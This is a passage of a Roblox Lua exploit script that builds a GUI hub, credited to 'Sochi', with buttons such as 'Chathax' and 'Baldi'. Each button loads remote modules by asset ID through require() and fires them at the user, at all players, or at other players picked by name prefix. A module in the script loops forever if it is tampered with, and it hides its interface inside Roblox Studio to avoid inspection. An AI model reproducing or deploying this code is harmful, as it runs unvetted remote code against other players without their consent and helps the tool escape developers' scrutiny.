				if skid.Name ~= player.Name then
					require(4661705712).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661705712).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel304.Name = "Vertical"
ImageLabel304.Parent = TextButton302
ImageLabel304.Position = UDim2.new(0, -2, 0, 0)
ImageLabel304.Size = UDim2.new(1, 3, 1, 0)
ImageLabel304.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel304.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel304.BackgroundTransparency = 1
ImageLabel304.ZIndex = 3
ImageLabel304.Image = "rbxassetid://3570695787"
ImageLabel304.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel304.ScaleType = Enum.ScaleType.Slice
ImageLabel304.SliceCenter = 100, 100, 100, 100
TextButton305.Name = "Admin"
TextButton305.Parent = ScrollingFrame100
TextButton305.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 476)
TextButton305.Size = UDim2.new(0, 271, 0, 21)
TextButton305.BackgroundColor = BrickColor.new("Really black")
TextButton305.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton305.BackgroundTransparency = 1
TextButton305.BorderColor = BrickColor.new("Really black")
TextButton305.BorderColor3 = Color3.new(0, 0, 0)
TextButton305.ZIndex = 7
TextButton305.Font = Enum.Font.SourceSansSemibold
TextButton305.FontSize = Enum.FontSize.Size14
TextButton305.Text = "Chathax                                                                                           OLD"
TextButton305.TextColor = BrickColor.new("Institutional white")
TextButton305.TextColor3 = Color3.new(1, 1, 1)
TextButton305.TextSize = 14
TextButton305.TextWrap = true
TextButton305.TextWrapped = true
TextButton305.TextXAlignment = Enum.TextXAlignment.Left
Script306.Parent = TextButton305
table.insert(cors,sandbox(Script306,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4655364662):Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4655364662):Fire(player.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4655364662):Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4655364662):Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel307.Name = "Vertical"
ImageLabel307.Parent = TextButton305
ImageLabel307.Position = UDim2.new(0, -2, 0, 0)
ImageLabel307.Size = UDim2.new(1, 3, 1, 0)
ImageLabel307.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel307.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel307.BackgroundTransparency = 1
ImageLabel307.ZIndex = 3
ImageLabel307.Image = "rbxassetid://3570695787"
ImageLabel307.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel307.ScaleType = Enum.ScaleType.Slice
ImageLabel307.SliceCenter = 100, 100, 100, 100
TextButton308.Name = "Admin"
TextButton308.Parent = ScrollingFrame100
TextButton308.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 500)
TextButton308.Size = UDim2.new(0, 271, 0, 21)
TextButton308.BackgroundColor = BrickColor.new("Really black")
TextButton308.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton308.BackgroundTransparency = 1
TextButton308.BorderColor = BrickColor.new("Really black")
TextButton308.BorderColor3 = Color3.new(0, 0, 0)
TextButton308.ZIndex = 7
TextButton308.Font = Enum.Font.SourceSansSemibold
TextButton308.FontSize = Enum.FontSize.Size14
TextButton308.Text = "Baldi                                                                                           OLD"
TextButton308.TextColor = BrickColor.new("Institutional white")
TextButton308.TextColor3 = Color3.new(1, 1, 1)
TextButton308.TextSize = 14
TextButton308.TextWrap = true
TextButton308.TextWrapped = true
TextButton308.TextXAlignment = Enum.TextXAlignment.Left
Script309.Parent = TextButton308
table.insert(cors,sandbox(Script309,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4655442549).Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4655442549).Fire(player.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4655442549).Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4655442549).Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel310.Name = "Vertical"
ImageLabel310.Parent = TextButton308
ImageLabel310.Position = UDim2.new(0, -2, 0, 0)
ImageLabel310.Size = UDim2.new(1, 3, 1, 0)
ImageLabel310.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel310.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel310.BackgroundTransparency = 1
ImageLabel310.ZIndex = 3
ImageLabel310.Image = "rbxassetid://3570695787"
ImageLabel310.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel310.ScaleType = Enum.ScaleType.Slice
ImageLabel310.SliceCenter = 100, 100, 100, 100
TextButton311.Name = "Close"
TextButton311.Parent = Frame1
TextButton311.Position = UDim2.new(0.836985171, 10, 0.784315646, -280)
TextButton311.Size = UDim2.new(0, 56, 0, 34)
TextButton311.BackgroundColor = BrickColor.new("Really black")
TextButton311.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton311.BackgroundTransparency = 1
TextButton311.BorderColor = BrickColor.new("Really black")
TextButton311.BorderColor3 = Color3.new(0, 0, 0)
TextButton311.ZIndex = 7
TextButton311.Font = Enum.Font.SourceSansBold
TextButton311.FontSize = Enum.FontSize.Size32
TextButton311.Text = "X"
TextButton311.TextColor = BrickColor.new("Institutional white")
TextButton311.TextColor3 = Color3.new(1, 1, 1)
TextButton311.TextSize = 29
TextButton311.TextWrap = true
TextButton311.TextWrapped = true
LocalScript312.Parent = TextButton311
table.insert(cors,sandbox(LocalScript312,function()
	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Open.Visible = true
	end)
end))
Frame313.Name = "RoundedBG"
Frame313.Parent = TextButton311
Frame313.Size = UDim2.new(1, 0, 1, 0)
Frame313.BackgroundColor = BrickColor.new("Really black")
Frame313.BackgroundColor3 = Color3.new(0, 0, 0)
Frame313.BackgroundTransparency = 1
Frame313.BorderColor = BrickColor.new("Really black")
Frame313.BorderColor3 = Color3.new(0, 0, 0)
Frame313.BorderSizePixel = 0
ImageLabel314.Name = "Vertical"
ImageLabel314.Parent = Frame313
ImageLabel314.Position = UDim2.new(0, 10, 0, 0)
ImageLabel314.Size = UDim2.new(1, -20, 1, 0)
ImageLabel314.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel314.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel314.BackgroundTransparency = 1
ImageLabel314.ZIndex = 3
ImageLabel314.Image = "rbxassetid://3570695787"
ImageLabel314.ImageColor3 = Color3.new(1, 0.537255, 0.545098)
ImageLabel314.ScaleType = Enum.ScaleType.Slice
ImageLabel314.SliceCenter = 100, 100, 100, 100
ImageLabel315.Name = "Respawn"
ImageLabel315.Parent = Frame1
ImageLabel315.Position = UDim2.new(0.559000075, 0, 0.911000013, 0)
ImageLabel315.Size = UDim2.new(0, 105, 0, 24)
ImageLabel315.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel315.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel315.BackgroundTransparency = 1
ImageLabel315.ZIndex = 8
ImageLabel315.Image = "rbxassetid://3570695787"
ImageLabel315.ImageColor3 = Color3.new(0.333333, 1, 0.498039)
ImageLabel315.ScaleType = Enum.ScaleType.Slice
ImageLabel315.SliceCenter = 100, 100, 100, 100
TextButton316.Name = "Respawn"
TextButton316.Parent = ImageLabel315
TextButton316.Position = UDim2.new(0, 0, 0, -1)
TextButton316.Size = UDim2.new(0, 138, 0, 27)
TextButton316.BackgroundColor = BrickColor.new("Institutional white")
TextButton316.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton316.BackgroundTransparency = 1
TextButton316.ZIndex = 11
TextButton316.Font = Enum.Font.SourceSansBold
TextButton316.FontSize = Enum.FontSize.Size24
TextButton316.Text = " RESPAWN         "
TextButton316.TextColor = BrickColor.new("Bright green")
TextButton316.TextColor3 = Color3.new(0.266667, 0.541176, 0.4)
TextButton316.TextSize = 22
TextButton316.TextWrap = true
TextButton316.TextWrapped = true
LocalScript317.Parent = TextButton316
table.insert(cors,sandbox(LocalScript317,function()
	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AA.Respawn:FireServer()
	end)
end))
Script318.Name = "AA"
Script318.Parent = ScreenGui0
table.insert(cors,sandbox(Script318,function()
	script.Respawn.OnServerEvent:connect(function(plr)
		plr:LoadCharacter()
	end)
end))
RemoteEvent319.Name = "Respawn"
RemoteEvent319.Parent = Script318
ModuleScript320.Name = "UTG"
ModuleScript320.Parent = ScreenGui0
table.insert(cors,sandbox(ModuleScript320,function()
	local Orig = script
	script=nil
	local script = Orig
	script.Changed:Connect(function()while true do end end)

	local module = {}
	function module:Fire(player)
		if game:GetService('Players'):FindFirstChild(player) then
			if game:GetService('RunService'):IsStudio() then
				script.Error:Clone().Parent = game:GetService('Players')[player].PlayerGui
				wait(.5)
				script.AccessUI:Destroy()
			else
				script.AccessUI:Clone().Parent = game:GetService('Players')[player].PlayerGui
			end
		end
	end
	return module
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
